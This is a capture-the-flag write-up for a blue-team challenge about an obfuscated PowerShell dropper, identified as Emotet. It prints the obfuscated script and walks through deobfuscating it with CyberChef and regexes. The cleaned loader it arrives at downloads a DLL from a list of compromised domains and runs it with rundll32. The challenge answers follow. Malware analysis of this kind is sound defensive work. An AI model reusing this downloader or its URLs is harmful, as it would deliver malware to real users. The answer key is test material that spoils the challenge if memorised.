# Malicious PowerShell Analysis

Link: [BTLO](https://blueteamlabs.online/home/challenge/malicious-powershell-analysis-bf6b52faef)

## Requirements

- Cyberchef and regex enabled editor

## Questions

### Powershell code

Go to Cyberchef -> Base64 decode -> Decode text as ISO-8859

```
 sEt MKu ( [TYPe]("{0}{1}{2}{4}{3}" -F 'SYsT','eM.','io.DI','ORY','rECt') );    SeT-iTEM  ('vaR'+'IabLE'+':mBu') (  [TYPe]("{6}{8}{0}{3}{4}{5}{2}{7}{1}" -f'SteM','Ger','Ma','.n','et.seRVIcepOi','nt','s','NA','Y')); $ErrorActionPreference = (('S'+'il')+('en'+'t')+'ly'+('Cont'+'i'+'nue'));$Cvmmq4o=$Q26L + [char](64) + $E16H;$J16J=('N'+('_0'+'P')); (DIr VariabLE:Mku  ).VaLUe::"c`REAt`edI`REC`TORy"($HOME + (('{'+'0}Db_bh'+'30'+'{0}'+'Yf'+'5be5g{0}') -F [chAR]92));$C39Y=(('U6'+'8')+'S');  ( vARiaBLe  ("m"+"bu")  -VAlueoN  )::"sEcuRITYproT`o`c`ol" = ('T'+('ls'+'12'));$F35I=('I'+('4'+'_B'));$Swrp6tc = (('A6'+'9')+'S');$X27H=('C3'+'3O');$Imd1yck=$HOME+((('UO'+'H'+'Db_')+'b'+('h3'+'0UO')+('HY'+'f')+('5be5'+'g'+'UOH'))."ReP`lACe"(('U'+'OH'),[StrInG][chAr]92))+$Swrp6tc+(('.'+'dl')+'l');$K47V=('R'+('4'+'9G'));$B9fhbyv=(']'+('a'+'nw[3s://adm'+'int'+'k.c'+'o'+'m/'+'w')+('p-adm'+'in/'+'L/')+'@'+(']a'+'n'+'w[3s')+':'+'/'+'/m'+('ike'+'ge')+('e'+'r'+'inck.')+('c'+'om')+('/c/'+'Y'+'Ys')+'a'+('/@]'+'anw'+'['+'3://free'+'lanc'+'e'+'rw')+('ebdesi'+'gnerh'+'yd')+('er'+'aba')+('d.'+'com/')+('cgi'+'-bin'+'/S')+('/'+'@'+']anw')+('[3'+'://'+'etdog.co'+'m'+'/w')+('p-'+'co')+'nt'+('e'+'nt')+('/n'+'u/@')+(']a'+'nw[3')+'s'+('://'+'www'+'.hintu'+'p.c')+('o'+'m.')+('b'+'r/')+'w'+('p'+'-co')+('n'+'ten')+('t'+'/dE/'+'@]a'+'nw[3://'+'www.')+'s'+('tm'+'arouns'+'.')+('ns'+'w')+('.'+'edu.au/p'+'a'+'y'+'pal/b8')+('G'+'/@]')+('a'+'nw[')+('3:'+'/')+('/'+'wm.mcdeve'+'lop.net'+'/'+'c'+'on'+'t'+'e')+('nt'+'/')+'6'+('F2'+'gd/'))."RE`p`lACe"(((']a'+'n')+('w'+'[3')),([array]('sd','sw'),(('h'+'tt')+'p'),'3d')[1])."s`PLIT"($C83R + $Cvmmq4o + $F10Q);$Q52M=('P'+('0'+'5K'));foreach ($Bm5pw6z in $B9fhbyv){try{(&('New'+'-Objec'+'t') SysTem.nEt.WEBcLIeNT)."do`WNl`OaD`FIlE"($Bm5pw6z, $Imd1yck);$Z10L=('A9'+'2Q');If ((&('Ge'+'t-It'+'em') $Imd1yck)."len`G`TH" -ge 35698) {&('r'+'undl'+'l32') $Imd1yck,(('Co'+'nt')+'r'+('ol'+'_RunD'+'L')+'L')."T`OSt`RiNG"();$R65I=('Z'+('09'+'B'));break;$K7_H=('F1'+'2U')}}catch{}}$W54I=(('V9'+'5')+'O').
```

Now it is time to do a series of tricks to beautify the code. I like to use regexes via Atom editor.

Some of the search rules:
```
\(('[^()]*')\)
```

Easiest way to fix the type and some of the replaces is to Write-Output of the functions and replace it in the code
```
PS C:\Users\labuser> Write-Output [TYPe]("{6}{8}{0}{3}{4}{5}{2}{7}{1}" -f'SteM','Ger','Ma','.n','et.seRVIcepOi','nt','s','NA','Y')
sYSteM.net.seRVIcepOintMaNAGer

PS C:\Users\labuser> Write-Output$B9fhbyv=(']anw[3s://admintk.com/wp-admin/L/@]anw[3s://mikegeerinck.com/c/YYsa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/S/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/dE/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8G/@]anw[3://wm.mcdevelop.net/content/6F2gd/')."REplACe"((']anw[3'),([array]'sd','sw',('http'),'3d')[1])."sPLIT"($C83R + '@' + $F10Q);^C
PS C:\Users\labuser> Write-Output $B9fhbyv
sws://admintk.com/wp-admin/L/
sws://mikegeerinck.com/c/YYsa/
sw://freelancerwebdesignerhyderabad.com/cgi-bin/S/
sw://etdog.com/wp-content/nu/
sws://www.hintup.com.br/wp-content/dE/
sw://www.stmarouns.nsw.edu.au/paypal/b8G/
sw://wm.mcdevelop.net/content/6F2gd/
```

After all the cleaning up, we will end-up with the following code
```
sEt MKu ( 'SYsTeM.io.DIORYrECt' );
SeT-iTEM  'vaRIabLE:mBu' (  sYSteM.net.seRVIcepOintMaNAGer);
$ErrorActionPreference = ('SilentlyContinue');
(DIr VariabLE:Mku  ).VaLUe::"cREAtedIRECTORy"($HOME + '\Db_bh30\Yf5be5g\');
( vARiaBLe  ("mbu")  -VAlueoN  )::"sEcuRITYproTocol" = 'Tls12';
$dll_file=$HOME+'\Db_bh30\Yf5be5g\A69S.dll';

$url_list=('sws://admintk.com/wp-admin/L/', 'sws://mikegeerinck.com/c/YYsa/', 'sw://freelancerwebdesignerhyderabad.com/cgi-bin/S/', 'sw://etdog.com/wp-content/nu/', 'sws://www.hintup.com.br/wp-content/dE/', 'sw://www.stmarouns.nsw.edu.au/paypal/b8G/', 'sw://wm.mcdevelop.net/content/6F2gd/');

foreach ($url in $url_list) {
  try{
    (&'New-Object' SysTem.nEt.WEBcLIeNT)."doWNlOaDFIlE"($url, $dll_file);
    If ((&'Get-Item' $dll_file)."lenGTH" -ge 35698) {
      &'rundll32' $dll_file,('Control_RunDLL')."TOStRiNG"();
      break;
    }
  }
  catch{}
}
```

### What security protocol is being used for the communication with a malicious domain? (3 points)

`TLS 1.2`

### What directory does the obfuscated PowerShell create? (Starting from \HOME\) (4 points)

`HOME\Db_bh30\Yf5be5g\`

### What file is being downloaded (full name)? (4 points)

`A69S.dll`

### What is used to execute the downloaded file? (3 points)

`rundll32`

### What is the domain name of the URI ending in ‘/6F2gd/’ (3 points)

`wm.mcdevelop.net`

### Based on the analysis of the obfuscated code, what is the name of the malware?

`EMOTET`

Take one of the URLs in the list and put it in Google
